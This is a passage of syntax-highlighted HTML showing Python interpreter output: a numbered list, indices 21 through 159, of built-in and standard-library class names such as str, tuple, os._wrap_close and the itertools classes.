<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'set'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'slice'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'staticmethod'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'complex'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'float'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'frozenset'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'property'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'managedbuffer'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'memoryview'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'tuple'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'enumerate'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'reversed'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'stderrprinter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'code'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'frame'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'builtin_function_or_method'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'method'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'function'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'mappingproxy'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">41</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'generator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'getset_descriptor'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'wrapper_descriptor'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'method-wrapper'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ellipsis'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'member_descriptor'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'types.SimpleNamespace'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'PyCapsule'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'longrange_iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'cell'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'instancemethod'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'classmethod_descriptor'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'method_descriptor'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'callable_iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'pickle.PickleBuffer'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">57</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'coroutine'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">58</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'coroutine_wrapper'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'InterpreterID'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'EncodingMap'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">61</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'fieldnameiterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'formatteriterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">63</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'BaseException'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'hamt'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'hamt_array_node'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">66</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'hamt_bitmap_node'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">67</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'hamt_collision_node'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">68</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'keys'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">69</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'values'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'items'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">71</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'Context'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'ContextVar'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'Token'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">74</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'Token.MISSING'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">75</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'moduledef'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">76</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'module'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'filter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">78</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'map'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'zip'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib._ModuleLock'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">81</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib._DummyModuleLock'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">82</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib._ModuleLockManager'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">83</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib.ModuleSpec'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">84</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib.BuiltinImporter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">85</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'classmethod'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">86</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib.FrozenImporter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">87</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib._ImportLockContext'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_thread._localdummy'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">89</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_thread._local'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_thread.lock'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_thread.RLock'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">92</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_io._IOBase'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">93</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_io._BytesIOBuffer'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">94</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_io.IncrementalNewlineDecoder'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'posix.ScandirIterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">96</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'posix.DirEntry'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib_external.WindowsRegistryFinder'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib_external._LoaderBasics'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib_external.FileLoader'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib_external._NamespacePath'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib_external._NamespaceLoader'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib_external.PathFinder'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib_external.FileFinder'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'zipimport.zipimporter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'zipimport._ZipImportResourceReader'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">106</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.Codec'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">107</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalEncoder'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.IncrementalDecoder'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">109</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.StreamReaderWriter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'codecs.StreamRecoder'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_abc._abc_data'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'abc.ABC'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">113</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_itemiterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.abc.Hashable'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.abc.Awaitable'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">116</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'types.GenericAlias'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.abc.AsyncIterable'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">118</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'async_generator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">119</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.abc.Iterable'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytes_iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">121</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytearray_iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">122</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_keyiterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_valueiterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">124</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list_iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list_reverseiterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">126</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'range_iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'set_iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str_iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">129</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'tuple_iterator'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">130</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.abc.Sized'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">131</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.abc.Container'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">132</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'collections.abc.Callable'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">133</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'os._wrap_close'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">134</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_sitebuiltins.Quitter'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">135</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_sitebuiltins._Printer'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">136</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_sitebuiltins._Helper'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">137</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'types.DynamicClassAttribute'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">138</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'types._GeneratorWrapper'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">139</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.WarningMessage'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">140</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.catch_warnings'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">141</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.accumulate'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">142</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.combinations'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">143</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.combinations_with_replacement'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">144</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.cycle'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">145</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.dropwhile'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">146</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.takewhile'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">147</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.islice'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">148</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.starmap'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">149</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.chain'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.compress'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">151</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.filterfalse'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">152</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.count'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">153</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.zip_longest'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">154</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.permutations'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">155</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.product'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">156</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.repeat'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">157</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools.groupby'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">158</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools._grouper'</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token number">159</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'itertools._tee'</span><span class="token operator">></span><span class="token punctuation">)</span>
